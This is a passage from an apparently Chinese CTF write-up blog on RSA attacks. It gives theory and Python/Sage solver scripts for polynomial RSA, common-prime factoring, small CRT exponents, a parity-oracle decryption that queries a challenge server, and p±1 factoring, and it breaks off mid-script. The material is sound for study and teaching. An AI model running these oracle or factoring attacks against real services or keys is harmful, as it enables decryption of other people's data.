= P*Q</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'xxxx'</span></span><br><span class="line">flag = list(bytearray(flag.encode()))</span><br><span class="line">m = S(flag)</span><br><span class="line">c = m^e</span><br></pre></td></tr></table></figure></li><li><p>在<span class="math inline">\(GF(p^{nbits})\)</span>上fetch_int</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">P.&lt;x&gt;=PolynomialRing(GF(p))</span><br><span class="line"><span class="comment">## 略去P,Q,N生成代码</span></span><br><span class="line">R.&lt;y&gt; = GF(p^<span class="number">2049</span>)</span><br><span class="line">m_int = Integer(bytes_to_long(flag))</span><br><span class="line">m_poly = P(R.fetch_int(m_int))</span><br><span class="line">c_poly = pow(m_poly, e, n)</span><br><span class="line">c_int = R(c_poly).integer_representation()</span><br></pre></td></tr></table></figure></li></ol><h4 id="exp-9">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line">N = </span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">p, q = N.factor()</span><br><span class="line">p, q = p[<span class="number">0</span>], q[<span class="number">0</span>]</span><br><span class="line">phi = (p**P.degree()<span class="number">-1</span>)*(p**Q.degree()<span class="number">-1</span>)</span><br><span class="line">e = </span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = c^d</span><br><span class="line">print(<span class="string">""</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.list()]))</span><br></pre></td></tr></table></figure><h3 id="rsa---large-common-factor-of-p-1-and-q-1">RSA - Large Common Factor of p-1 and q-1</h3><h4 id="theorem-11">Theorem</h4><p>Given <span class="math inline">\(N=pq,g|(p-1),g|(q-1)\)</span>. (We call it common prime RSA)</p><p>If g is large enough, we have an efficient factoring method for N. (魔改rho)</p><p>[可行分析]</p><p><span class="math inline">\(p-1=ga,q-1=gb,N-1=gh(h=gab+a+b)\)</span> <span class="math inline">\(\therefore x^{N-1}\ (mod\ p)\)</span>至多有a个值 <span class="math inline">\(\therefore\)</span>用<span class="math inline">\(x\rightarrow x^{N-1}+3\)</span>代替rho中的迭代函数，能在<span class="math inline">\(O(\sqrt a)=O(N^{1/4-\gamma /2})\)</span>下分解N.</p><h4 id="exp-10">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (pow(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(abs(a - b), n)</span><br><span class="line">            print(<span class="string">'&#123;&#125; in &#123;&#125; circle'</span>.format(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">2062899536811871554818178359324161185631864322612928428737135410318396234838612759353304630466467882907238599097155276236974469077407927587176395102072905755064272779705304103155044175760772870357960042973800466612294120431806053764425995115279842108284227580763784948966673592802930476849233889221985236020626654664840038198318033843640935727802767372332931755961464416884826343968074190784107977317020369409515252779597705798495979144688260140280406347997234735504377161004933444363855269475346955181189441066456092467816293921375731674289071178645028262851698651731976240122083422857066357348367076175249101149547</span></span><br><span class="line">    print(rho(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more">More</h4><p>common prime RSA在g过小时，g也能轻易通过分解N-1来解出（rho等算法分解出的小因子尝试即可）</p><p>关于这类的题型我还没在CTF赛题中见到过，下面给出生成的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span><span class="params">(nbits, gamma)</span>:</span></span><br><span class="line">    g = <span class="number">2</span> * getPrime(int(nbits * gamma))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">        p = g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">            q = g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> GCD(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(int((<span class="number">0.5</span> - gamma) * nbits - <span class="number">1</span>))</span><br><span class="line">                q = g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(nbits, gamma)</span>:</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    lcm = (p * q) // GCD(p, q)</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> GCD(e, lcm) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    d = inverse(e, lcm)</span><br><span class="line">    <span class="keyword">return</span> (n, e), (p, q, d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    (n, e), (p, q, d) = gen_key(<span class="number">2048</span>, <span class="number">0.485</span>)</span><br><span class="line">    print(<span class="string">'n ='</span>, n)</span><br><span class="line">    print(<span class="string">'p ='</span>, p)</span><br><span class="line">    print(<span class="string">'q ='</span>, q)</span><br><span class="line">    print(<span class="string">'e ='</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="rsa---small-crt-private-exponents">RSA - Small CRT Private Exponents</h3><h4 id="theorem-12">Theorem</h4><p>平衡的RSA-CRT密码系统下，q&lt;p&lt;2q. 且满足<span class="math inline">\(ed_{p}\equiv 1(mod\ p-1),ed_{q}\equiv 1(mod\ q-1)\)</span></p><p>则<span class="math inline">\(d_{p},d_{q}&lt;min\\{\frac{1}{4}(\frac{N}{e})^{\frac{2}{5}},\frac{1}{3}N^{\frac{1}{4}}\\}\)</span>成立时，可有效破解RSA-CRT算法. <span class="math display">\[\because ed_{p}=1+k(p-1),ed_{q}=1+l(q-1)\\\\\therefore e^{2}d_{p}d_{q}+kl(1-N)+e(d_{p}(l-1)+d_{q}(k-1))=k+l-1.\\\\令x=d_{p}(l-1)+d_{q}(k-1),y=kl,z=k+l-1,\omega =d_{p}d_{q}\\\\有ex+(1-N)y+e^{2}\omega = z,矩阵表示下则为\]</span> <img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-15_22-34-31.png"></p><p>构造一组基如下：</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-15_22-36-36.png"></p><p>我们有如下结论：</p><p>记<span class="math inline">\(v_{0}=(4ex,4N^{\frac{1}{2}}y,e^{\frac{3}{5}}N^{\frac{2}{5}}z)\)</span>. 则可以看出<span class="math inline">\(v_{0}\)</span>一定是L约化基的三个行向量的线性组合.</p><p>LLL计算后的约化基<span class="math inline">\(\\{b_{1},b_{2},b_{3}\\}\)</span>，选取一个适当的上界M，令<span class="math inline">\(|a_{i}|\leq M\)</span>, 则验证线性组合<span class="math inline">\(v=a_{1}b_{1}+a_{2}b_{2}+a_{3}b_{3}\)</span>对应的<span class="math inline">\(x,y,z,\omega\)</span>，看得到的数据能否正确分解N即可.</p><p>M视具体情况而定</p><h4 id="exp-11">exp</h4><p>暂无（因为生成满足要求的<span class="math inline">\(d_{p},d_{q}\)</span>以及使对应的<span class="math inline">\(d&gt;N^{0.292}\)</span>有点困难）</p><h3 id="rsa---parity-oracle">RSA - Parity Oracle</h3><h4 id="theorem-13">Theorem</h4><p>假设存在一个oracle，能对给定密文进行解密并给出对应明文的奇偶信息，则我们只需要log(N)次就能解密任意密文.</p><p><span class="math inline">\(c\equiv m^{e}(mod\ N)\)</span>, 向oracle机发送<span class="math inline">\(2^{e}c\equiv (2m)^{e}(mod\ N)\)</span>,则返回奇时，说明<span class="math inline">\(2m&gt;N\)</span>，反之<span class="math inline">\(2m&lt;N\)</span></p><p>继续往下分析，此时发送<span class="math inline">\((2^{2})^{e}c(mod\ N)\)</span>, 如果先前返回奇，则此时等同于在校验<span class="math inline">\(2(2m-N)\)</span>与N的大小关系，即返回奇说明<span class="math inline">\(m\in (\frac{3N}{4},N)\)</span>，反之<span class="math inline">\(m\in (\frac{N}{2},\frac{3N}{4})\)</span>，先前返回偶的这一轮次不再分析</p><p>接下来轮次也类似，二分log(N)次即可.</p><h4 id="exp-12">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c)</span>:</span></span><br><span class="line">    io = remote(<span class="string">'111.198.29.45'</span>, <span class="string">'42484'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'You can input ciphertext(hexdecimal) now\n'</span>)</span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(c) &amp; <span class="number">1</span>:</span><br><span class="line">        c = <span class="string">'0'</span> + c</span><br><span class="line">    io.sendline(c)</span><br><span class="line">    res = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">assert</span>(res == <span class="string">b'odd'</span> <span class="keyword">or</span> res == <span class="string">b'even'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">b'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    nbits = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = nbits</span><br><span class="line">    low = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    high = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nbits):</span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            high = (low + high) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = (low + high) / <span class="number">2</span></span><br><span class="line">        print(i, <span class="string">'/'</span>, nbits)</span><br><span class="line">    <span class="keyword">return</span> int(high)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#c = int(input("c = "))</span></span><br><span class="line">    <span class="comment">#e = int(input("e = "))</span></span><br><span class="line">    <span class="comment">#n = int(input("n = "))</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">    c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line">    m = partial(c, e, n)</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="rsa---williams-p1-and-pollards-p-1">RSA - William's p+1 and Pollard's p-1</h3><h4 id="theorem-14">Theorem</h4><p>如果要分解的N包含的素数因子p，使得p+1或p-1是平滑的（即只有适当上界的小因子），则William's p+1和Pollard's p-1算法能很好实现分解.</p><ul><li><p>William's p+1 Algorithm</p><p>Step 1：选择整数A(A&gt;2)来表征卢卡斯序列<span class="math inline">\(V_{j}=AV_{j-1}-V_{j-2}\)</span>，并初始化<span class="math inline">\(V_{0}=2,V_{1}=A\)</span>.</p><p>Step 2：计算序列到<span class="math inline">\(j=m!\)</span>.</p><p>​ ps：这步有很大的操作空间（在More里会涉及相关简化计算和证明）</p><p>Step 3：计算<span class="math inline">\(gcd(V_{j}-2,N)\)</span>，如果结果等于1或N，则m++并返回Step2，否则进入Step4.</p><p>Step 4：检查p+1是否是m!的因子，如果是，则说明找到的p是p+1平滑的.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-18_20-33-25.png"></p><p>因为我们事先不知道p，所以也就无从计算雅各比符号(D/p)，但平方非剩余概率趋于1/2，考虑选取多个A多线程即可（n个A就能使互斥事件的概率降到大约<span class="math inline">\(\frac{1}{2^{n}}\)</span>）</p></li><li><p>Pollard's p-1 Algorithm</p><p>p-1是B-smooth时，很大概率上<span class="math inline">\((p-1)|B!\)</span>（不考虑p-1有很多重复的趋近于B的质因子）</p><p>所以计算<span class="math inline">\(a^{m!}-1\)</span>，以及校验gcd即可，<span class="math inline">\(m_{max}\)</span>可以是B也可以适当上调.</p></li></ul><h4 id="exp-13">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">factor_state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_with_sqrt</span><span class="params">(a, c, b, n, mod)</span>:</span>  <span class="comment"># (a+c*sqrt(b))^n</span></span><br><span class="line">    states = [(a % mod, c % mod)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(n, <span class="number">2</span>))):</span><br><span class="line">        new_state = ((pow(states[i][<span class="number">0</span>], <span class="number">2</span>, mod) + b * pow(states[i][<span class="number">1</span>], <span class="number">2</span>, mod)) %</span><br><span class="line">                     mod, (<span class="number">2</span> * states[i][<span class="number">0</span>] * states[i][<span class="number">1</span>]) % mod)</span><br><span class="line">        states.append(new_state)</span><br><span class="line">    n_bin = bin(n)[<span class="number">2</span>:][::<span class="number">-1</span>]</span><br><span class="line">    res_x = <span class="number">1</span></span><br><span class="line">    res_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(n_bin)):</span><br><span class="line">        <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">            res_x, res_y = (res_x * states[i][<span class="number">0</span>] + res_y * states[i][<span class="number">1</span>] *</span><br><span class="line">                            b) % mod, (res_x * states[i][<span class="number">1</span>] + res_y * states[i][<span class="number">0</span>]) % mod</span><br><span class="line">    <span class="keyword">return</span> res_x, res_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">william_factor</span><span class="params">(n, index)</span>:</span></span><br><span class="line">    start = time.clock()</span><br><span class="line">    <span class="keyword">global</span> factor_state</span><br><span class="line">    A = getRandomRange(<span class="number">3</span>, n)</span><br><span class="line">    <span class="comment">#m = 2</span></span><br><span class="line">    <span class="comment">#next_pos = 1</span></span><br><span class="line">    m = <span class="number">3000</span></span><br><span class="line">    next_pos = reduce(<span class="keyword">lambda</span> x, y : x * y, [i + <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>)])</span><br><span class="line">    B = A**<span class="number">2</span> - <span class="number">4</span></span><br><span class="line">    <span class="comment">#res_x1, res_y1 = A, -1</span></span><br><span class="line">    <span class="comment">#res_x2, res_y2 = A, 1</span></span><br><span class="line">    res_x1, res_y1 = pow_with_sqrt(A, <span class="number">-1</span>, B, next_pos, n)</span><br><span class="line">    res_x2, res_y2 = pow_with_sqrt(A, <span class="number">1</span>, B, next_pos, n)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> factor_state == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        print((index, m))</span><br><span class="line">        next_pos *= m <span class="comment">#next_pos = m!</span></span><br><span class="line">        C = inverse(pow(<span class="number">2</span>, next_pos, n), n)</span><br><span class="line">        res_x1, res_y1 = pow_with_sqrt(res_x1, res_y1, B, m, n)</span><br><span class="line">        res_x2, res_y2 = pow_with_sqrt(res_x2, res_y2, B, m, n)</span><br><span class="line">        res_x, res_y = (res_x1 + res_x2) % n, (res_y1 + res_y2) % n</span><br><span class="line">        <span class="keyword">assert</span>(iroot(B, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">False</span> <span class="keyword">and</span> res_y != n)</span><br><span class="line">        <span class="keyword">if</span> iroot(B, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            res_x = (res_x + res_y * iroot(B, <span class="number">2</span>)[<span class="number">0</span>]) % n</span><br><span class="line">        <span class="comment"># Vi = C((A-sqrt(B))^(m!)+(A+sqrt(B))^(m!))</span></span><br><span class="line">        Vi = (C * res_x) % n</span><br><span class="line">        p = GCD(Vi - <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">assert</span>(p != n) <span class="comment">#p=n说明lucas序列下标过大</span></span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            factor_state = <span class="literal">True</span></span><br><span class="line">            print(<span class="string">'p ='</span>, p)</span><br><span class="line">            end = time.clock()</span><br><span class="line">            print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">    <span class="comment">#n = 112729</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=william_factor, args=(n, i))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more-1">More</h4><p>关于William's p+1 Algorithm的证明：</p><p>Lucas Functions：设<span class="math inline">\(\alpha,\beta\)</span>是<span class="math inline">\(x^{2}-Px+Q=0\)</span>的根，且有<img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_15-57-19.png" style="zoom:60%;"></p><p>则定义<span class="math inline">\(\Delta=(\alpha-\beta)^{2}=P^{2}-4Q\)</span>，知<span class="math inline">\(P=\alpha + \beta,Q=\alpha\beta\)</span>.</p><p>有如下定理：</p><p>p为奇素数，且<span class="math inline">\(p\nmid Q\)</span>，勒让德符号<span class="math inline">\((\frac{\Delta}{p})=\epsilon\)</span>，则有 <span class="math display">\[U_{(p-\epsilon)m}(P,Q)\equiv 0(mod\ p)\\\\V_{(p-\epsilon)m}(P,Q)\equiv 2Q^{\frac{m(1-\epsilon)}{2}}(mod\ p)\]</span> 假设我们有p+1|R，Q=1，<span class="math inline">\((\frac{\Delta}{p})=\epsilon=-1\)</span>，则由上述定理可知： <span class="math display">\[U_{R}(P,1)\equiv 0(mod\ p)\\\\V_{R}(P,1)-2\equiv 0(mod\ p)\]</span> 因为易推出<span class="math inline">\(V_{n+1}=PV_{n}-QV_{n-1}=PV_{n}-V_{n-1}\)</span>，则只要在该lucas序列下求出<span class="math inline">\(V_{R}\)</span>即可.</p><p>我上面的exp里取的R是<span class="math inline">\(m!(m\in N^{+})\)</span>，但m足够大时（如m=1000时，<span class="math inline">\(R≈2^{8000}\)</span>），逐项递推变得低效不可解.</p><p>因此简化思想如下：</p><p>上述Lucas序列对应通项为<span class="math inline">\(\frac{(P-\sqrt{P^{2}-4})^{n}+(P+\sqrt{P^{2}-4})^{n}}{2^{n}}\)</span>，先fuzz出一个m（m过大时，<span class="math inline">\(gcd(V_R-2,N)=N\)</span>），再从<span class="math inline">\(V_{m!}\)</span>开始p+1 factor即可，这里还应记住保留前状态<span class="math inline">\((P-\sqrt{P^{2}-4})^{(m-1)!}\)</span>，以便在求解<span class="math inline">\((P-\sqrt{P^{2}-4})^{m!}\)</span>时只要做前状态的m次幂。</p><p>这里也记录一下Coinc1dens师傅的出题笔记：</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_17-28-56.png"></p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_17-28-41.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 